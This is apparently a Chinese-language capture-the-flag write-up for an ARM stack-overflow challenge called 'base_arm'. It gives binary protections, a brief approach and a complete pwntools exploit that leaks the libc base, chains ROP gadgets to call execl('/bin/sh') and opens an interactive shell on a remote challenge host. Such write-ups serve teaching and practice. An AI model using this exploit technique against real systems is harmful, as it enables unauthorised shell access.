# base_arm

## 文件属性

|属性  |值    |
|------|------|
|Arch  |armhf |
|RELRO |Full  |
|Canary|off   |
|NX    |on    |
|PIE   |off   |
|strip |no    |
|libc  |2.35-0ubuntu1|

## 解题思路

题目上来送了 libc，还给了一个非常直接的栈溢出，直接找 gadget 就行。
简单一点可以设置完 `r0` 直接运行 `system`，我这里运行
`execl("/bin/sh", "/bin/sh", NULL)` 是差不多的。

> [!WARNING]
> 找的 gadget 里面不能有 `pop {..., sp, ...}` 之类涉及 sp 寄存器的指令，会报
> SIGILL 异常。

## EXPLOIT

```python
from pwn import *
def GOLD_TEXT(x): return f'\x1b[33m{x}\x1b[0m'
context.arch = 'arm'
EXE = './base_arm'

def payload(lo: int):
    global t
    if lo:
        if lo & 2:
            t = process(['qemu-arm', '-g', '1337', EXE])
            gdb.attach(('127.0.0.1', 1337), 'b *0x10560\nc', EXE)
        else:
            t = process(['qemu-arm', EXE])
    else:
        t = remote('10.1.100.107', 9999)
    elf = ELF(EXE)
    libc = ELF('libc.so.6')

    t.recvuntil(b'stream:')
    stdout = int(t.recvline(), 16)
    libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
    success(GOLD_TEXT(f'Leak libc_base: {libc_base:#x}'))
    libc.address = libc_base

    t.sendafter(b'message: ', flat({ 0x44: [
        libc_base + 0xbd3a0, # pop {r2, sl, ip, pc}
        0,
        0,
        0,
        libc_base + 0x843b8, # pop {r0, r1, pc}
        next(libc.search(b'/bin/sh')),
        next(libc.search(b'/bin/sh')),
        libc.symbols['execl'],
    ]}, filler=b'\0'))

    t.clean()
    t.interactive()
    t.close()
```

![flag](assets/flag.base_arm.png)
